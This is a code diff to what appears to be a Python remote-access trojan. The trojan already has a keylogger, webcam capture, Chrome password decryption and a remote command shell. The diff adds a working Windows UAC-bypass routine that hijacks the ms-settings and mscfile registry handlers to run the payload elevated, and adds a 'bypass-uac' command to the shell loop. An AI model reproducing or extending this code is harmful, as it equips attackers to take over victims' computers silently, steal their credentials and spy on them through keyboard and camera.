@@ -1,11 +1,14 @@
 import socket
 import json
-import subprocess
-import os
+
 import pyautogui
 import threading
 import shutil
-import sys
+
+from winreg import *
+import sys, subprocess, os
+
+from Scripts.bottle import unicode
 from cv2 import VideoCapture,imwrite
 from  os.path import isfile
 import random
@@ -16,12 +19,11 @@ import getpass
 import ctypes
 from pynput.keyboard import Listener
 import time
-import uuid
-import re
+
 import sqlite3
 import base64
 from urllib.request import Request, urlopen
-import errno
+
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import (
     Cipher, algorithms, modes)
@@ -29,6 +31,79 @@ import psutil
 import urllib.request as urllib2
 import platform
 import struct
+def bypassuac():
+
+    HKCU = HKEY_CURRENT_USER
+
+    if len(sys.argv) == 2:
+        payload = sys.argv[0]
+    else:
+
+        payload = sys.executable
+        exploitwork = False
+
+
+    if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+
+        os.startfile(payload)
+
+
+    # Get Windows Version
+    ver = sys.getwindowsversion()
+    win_ver = '.'.join(map(str, (ver.major, ver.minor)))
+
+    # Get UAC Level
+    key = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
+    uac = EnumValue(OpenKey(HKEY_LOCAL_MACHINE, key), 0)[1]
+
+    def create_key(path, key, value):
+        try:
+            CreateKey(HKCU, path)
+            reg_key = OpenKey(HKCU, path, 0, KEY_WRITE)
+            SetValueEx(reg_key, key, 0, REG_SZ, value)
+            CloseKey(reg_key)
+        except WindowsError:
+            raise
+
+    def delete_key(path):
+        key = path.split("\\")
+        for x in range(6, 2, -1):
+            reg_path = '\\'.join(key[:x])
+            DeleteKey(HKCU, reg_path)
+
+    def exploit(key, exploit, cmd):
+        path = r'Software\Classes\{key}\shell\open\command'.format(key=key)
+        create_key(path, None, cmd)
+        create_key(path, 'DelegateExecute', None)
+        os.startfile(exploit)
+        time.sleep(5)
+        delete_key(path)
+
+    if uac == 2:
+        UAC_LEVEL = 'High'
+    elif uac == 5:
+        UAC_LEVEL = 'Default'
+    elif uac == 0:
+        UAC_LEVEL = 'None'
+    else:
+        UAC_LEVEL = 'Unknown'
+
+    # EXPLOIT
+    if UAC_LEVEL == 'High':
+        exploitwork = False
+
+
+    elif UAC_LEVEL == 'None':
+        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(payload), None, 1)
+        exploitwork = True
+    else:
+        if win_ver == '10.0':
+            exploit('ms-settings', 'ComputerDefaults.exe', payload)
+            exploitwork =True
+        else:
+            exploit('mscfile', 'CompMgmtLauncher.exe', payload)
+            exploitwork = True
+    return exploitwork
 def webcamlist():
 
     index = 0
@@ -409,7 +484,7 @@ def chromepassword():
         return cipher
 
     def dpapi_decrypt(encrypted):
-        import ctypes
+
         import ctypes.wintypes
 
         class DATA_BLOB(ctypes.Structure):
@@ -876,6 +951,11 @@ def shell():
                         continue
                 elif command[:11] == "webcam_list":
                     webcamlist()
+                elif command[:10] == "bypass-uac":
+                    if bypassuac() == True:
+                        sys.exit()
+                    else:
+                        os.startfile(sys.executable)
                 else:
 
                     execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
